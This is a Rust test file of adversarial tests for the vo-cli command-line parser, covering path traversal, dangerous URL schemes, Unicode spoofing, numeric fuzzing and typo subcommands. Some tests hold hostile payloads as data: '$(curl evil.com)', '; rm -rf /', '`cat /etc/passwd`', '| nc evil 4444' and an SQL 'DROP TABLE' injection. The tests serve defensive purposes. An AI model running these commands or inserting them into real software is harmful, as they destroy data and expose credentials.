//! BLACK-HAT adversarial tests for vo-cli.
//! Attack surface: injection, path traversal, unicode abuse, numeric fuzzing.

use std::ffi::OsString;
use vo_cli::cli::{interpret_cli_from, Command};
use vo_cli::parse::parse_strict_numeric;

#[test]
fn path_traversal_check_passes_parser() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("check"),
        OsString::from("../../etc/passwd"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    assert!(matches!(cli.command, Command::Check { .. }));
}

#[test]
fn engine_url_accepts_dangerous_schemes() {
    for url in [
        "ftp://evil.com:2121/pwn",
        "file:///etc/shadow",
        "javascript:alert(1)",
        "",
    ] {
        let args = vec![
            OsString::from("vo"),
            OsString::from("status"),
            OsString::from("i"),
            OsString::from("--engine-url"),
            OsString::from(url),
        ];
        let cli = interpret_cli_from(args).unwrap();
        if let Command::Status { engine_url, .. } = cli.command {
            assert_eq!(engine_url, url);
        }
    }
}

#[test]
fn shell_metacharacters_pass_through_unsanitized() {
    let payloads = [
        "$(curl evil.com)",
        "; rm -rf /",
        "`cat /etc/passwd`",
        "| nc evil 4444",
    ];
    for payload in payloads {
        let args = vec![
            OsString::from("vo"),
            OsString::from("purge"),
            OsString::from("--instance"),
            OsString::from(payload),
        ];
        let cli = interpret_cli_from(args).unwrap();
        if let Command::Purge { instance } = &cli.command {
            assert_eq!(instance, payload);
        }
    }
}

#[test]
fn sql_injection_in_instance_id_survives_parse() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("purge"),
        OsString::from("--instance"),
        OsString::from("'; DROP TABLE instances;--"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Purge { instance } = &cli.command {
        assert!(instance.contains("DROP TABLE"));
    }
}

#[test]
fn unicode_confusables_and_zero_width_in_ids() {
    let spoofed = "inst-\u{0430}bc123"; // Cyrillic а
    let args = vec![
        OsString::from("vo"),
        OsString::from("status"),
        OsString::from(spoofed),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Status { instance, .. } = &cli.command {
        assert!(!instance.is_ascii());
    }
    let invisible = "wf\u{200B}\u{200C}\u{200D}123"; // ZWSP+ZWNJ+ZWJ
    let args2 = vec![
        OsString::from("vo"),
        OsString::from("compensate"),
        OsString::from(invisible),
    ];
    let cli2 = interpret_cli_from(args2).unwrap();
    if let Command::Compensate { workflow_id, .. } = &cli2.command {
        assert!(workflow_id.contains('\u{200B}'));
    }
}

#[test]
fn duplicate_flags_are_rejected() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("gc"),
        OsString::from("--engine-url"),
        OsString::from("http://good:3000"),
        OsString::from("--engine-url"),
        OsString::from("http://evil:3000"),
    ];
    let result = interpret_cli_from(args);
    assert!(
        result.is_err(),
        "duplicate flags should be rejected by clap"
    );
}

#[test]
fn rebuild_mutually_exclusive_flags_allowed() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("rebuild"),
        OsString::from("--list"),
        OsString::from("--force"),
        OsString::from("--projection-id"),
        OsString::from("x"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Rebuild {
        list_projections,
        force,
        projection_id,
        ..
    } = cli.command
    {
        assert!(list_projections && force && projection_id.is_some());
    }
}

#[test]
fn numeric_parser_rejects_attacks() {
    let attacks = [
        "0xDEAD", "0x0", "1e10", "1.0", " 42", "42 ", "\t42", "42abc", "4_2",
    ];
    for a in &attacks {
        assert!(parse_strict_numeric(a).is_err(), "should reject: {a}");
    }
}

#[test]
fn numeric_overflow_is_specific() {
    let err = parse_strict_numeric("99999999999999999999999999999999").unwrap_err();
    assert!(err.to_string().contains("overflowed"));
}

#[test]
fn numeric_leading_zeros_allowed() {
    assert_eq!(parse_strict_numeric("007").unwrap(), 7);
}

#[test]
fn typosquatting_subcommands_rejected() {
    for typo in ["chcek", "compensat", "stauts", "purgge", "rebulid"] {
        let args = vec![OsString::from("vo"), OsString::from(typo)];
        assert!(
            interpret_cli_from(args).is_err(),
            "typosquat '{typo}' accepted"
        );
    }
}

#[test]
fn global_flag_before_subcommand_rejected() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("--force"),
        OsString::from("compensate"),
        OsString::from("wf-1"),
    ];
    assert!(interpret_cli_from(args).is_err());
}
